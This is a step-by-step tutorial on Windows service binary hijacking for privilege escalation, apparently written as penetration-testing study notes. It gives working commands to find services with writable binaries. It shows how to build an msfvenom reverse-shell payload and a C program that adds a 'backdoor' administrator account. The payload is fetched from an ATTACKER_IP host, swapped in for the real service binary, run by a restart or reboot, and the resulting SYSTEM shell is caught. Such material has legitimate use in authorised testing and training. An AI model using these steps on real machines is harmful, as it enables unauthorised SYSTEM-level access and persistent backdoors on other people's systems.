**Service Binary Hijacking** is a local privilege escalation technique that abuses weak permissions on Windows service executables. If a service runs with high privileges (e.g., LocalSystem) and its binary is writable by a low-privileged user, the attacker can replace it with a malicious executable and execute code as SYSTEM.

This is common in third-party or user-installed software (e.g., XAMPP), where developers misconfigure file permissions.

---

## Service Enumeration and Target Identification

The first step is to enumerate services and identify binaries that are not part of the default Windows directories. Services running from custom paths are more likely to be vulnerable.

Using PowerShell:

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

To focus only on running services:

```powershell
Get-CimInstance -ClassName win32_service | Where-Object {$_.State -eq "Running"} | Select Name,PathName
```

Look for services with binaries outside `C:\Windows\System32`, for example:

```
mysql   Running   C:\xampp\mysql\bin\mysqld.exe
```

This indicates a user-installed service, which is a strong candidate for misconfigurations.

---

## Verifying Weak Permissions on Service Binaries

Once a suspicious service is identified, extract the binary path and check its permissions.

```powershell
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

A vulnerable configuration will show something like:

```
BUILTIN\Users:(F)
```

This means any user can modify or replace the binary.

| Mask | Permissions              |
|------|--------------------------|
| F    | Full access              |
| M    | Modify access            |
| RX   | Read and execute access  |
| R    | Read-only access         |
| W    | Write-only access        |
If only `RX` (Read & Execute) is present, the attack is not possible.

---

## Automated Detection with PowerUp

PowerUp can automate the discovery of modifiable service binaries.

Load the script:

```powershell
powershell -ep bypass
. .\PowerUp.ps1
```

Run the check:

```powershell
Get-ModifiableServiceFile
```

Example output:

```
ServiceName  : mysql
Path         : C:\xampp\mysql\bin\mysqld.exe
StartName    : LocalSystem
```

This confirms:

- The service runs as SYSTEM
    
- The binary is writable
    

Be aware that automated tools may fail if the service path contains arguments.

---

## Preparing a Malicious Service Binary

Instead of modifying configurations, the attack replaces the service executable entirely.

A common approach is generating a reverse shell using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o mysqld.exe
```

Alternatively, a custom binary can be compiled to create an admin user:

```c
#include <stdlib.h>

int main() {
    system("net user backdoor Pass123! /add");
    system("net localgroup administrators backdoor /add");
    return 0;
}
```

Compile from Kali:

```bash
x86_64-w64-mingw32-gcc adduser.c -o mysqld.exe
```

---

## Transferring and Replacing the Service Binary

Host the payload:

```bash
python3 -m http.server 8080
```

Download it on the target:

```powershell
iwr -uri http://ATTACKER_IP:8080/mysqld.exe -OutFile mysqld.exe
```

Backup and replace the original binary:

```powershell
move C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\mysqld_backup.exe
move .\mysqld.exe C:\xampp\mysql\bin\mysqld.exe
```

At this point, the malicious binary is in place.

---

## Triggering Execution via Service Restart

If the user has permission, restart the service using its name:

```powershell
net stop mysql
net start mysql
```

If access is denied, check if the service starts automatically:

```powershell
Get-CimInstance -ClassName win32_service | Where-Object {$_.Name -eq "mysql"} | Select StartMode
```

If `StartMode` is `Auto`, rebooting the system will trigger execution.

Check privileges:

```powershell
whoami /priv
```

If `SeShutdownPrivilege` is present:

```powershell
shutdown /r /t 0
```

After reboot, the service executes the malicious binary as SYSTEM.

---

## Post-Exploitation Verification

If a user-creation payload was used:

```powershell
Get-LocalGroupMember administrators
```

Example result:

```
User   CLIENTWK220\backdoor
```

If a reverse shell payload was used, catch it:

```bash
nc -lvnp 4444
```

You should now have a SYSTEM shell.
